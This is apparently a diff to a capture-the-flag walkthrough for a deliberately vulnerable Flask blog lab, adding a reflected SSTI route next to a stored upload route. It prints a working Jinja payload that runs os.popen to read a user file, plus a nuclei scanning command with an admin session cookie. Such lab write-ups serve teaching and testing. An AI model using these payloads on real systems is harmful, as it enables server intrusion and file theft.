@@ -79,12 +79,47 @@ not bypass the form.)
 
 ---
 
-## Step 3 — Insecure upload + SSTI → RCE
+## Step 3 — SSTI → RCE
 
-In the admin dashboard, "Blogbeitrag erstellen" has a **Titelbild** file
-upload with no type/content validation. When a post is opened, the uploaded
-file's bytes are passed through `render_template_string` — so upload a file
-whose contents are a Jinja Server-Side Template Injection payload.
+The admin area renders beitrag content through Jinja's
+`render_template_string`. There are two ways to hit it; both run as the web
+user (meant to be `analyst`).
+
+### 3a — Reflected preview (scanner-detectable)
+
+`/admin/preview?content=…` renders the parameter and reflects it in the same
+response — a classic single-request SSTI. Confirm with:
+
+```
+/admin/preview?content={{7*7}}      → prints 49
+```
+
+Then get code execution directly:
+
+```
+/admin/preview?content={{ cycler.__init__.__globals__.os.popen('cat /home/analyst/user.txt').read() }}
+```
+
+**Detecting it with a scanner.** It sits behind the admin login, so point the
+scanner at it *with the session cookie* you got in Step 2 (copy `session=…`
+from your browser's devtools / the login response):
+
+```bash
+nuclei -u "http://192.168.1.139:5015/admin/preview?content=FUZZ" \
+       -H "Cookie: session=<your-admin-session-cookie>" \
+       -t http/vulnerabilities/ -tags ssti
+```
+
+nuclei's SSTI templates inject `{{7*7}}`-style payloads into `content` and
+flag the reflected `49`.
+
+### 3b — Stored upload (persistent variant)
+
+"Blogbeitrag erstellen" has a **Titelbild** upload with no type/content
+validation. When the post is opened, the uploaded file's bytes are rendered as
+a template — so upload a "picture" that is actually a Jinja payload. This path
+is multi-step and authenticated, so off-the-shelf scanners won't find it; it's
+the manual/persistent route.
 
 Create a file `exploit.png` containing:
 
@@ -129,4 +164,4 @@ challenge design (sudo misconfig, SUID, cron, etc.).
 |---|--------------------------|------------------------------------------|
 | 1 | SQL injection            | `projects_detail` — f-string `SELECT` on `?q=` search |
 | 2 | Insecure file upload     | `admin_dashboard` — no upload validation |
-| 3 | SSTI → RCE               | `blog_post` — `render_template_string`   |
+| 3 | SSTI → RCE               | `admin_preview` — reflected `render_template_string` (scanner-detectable); `blog_post` — stored, via uploaded file |
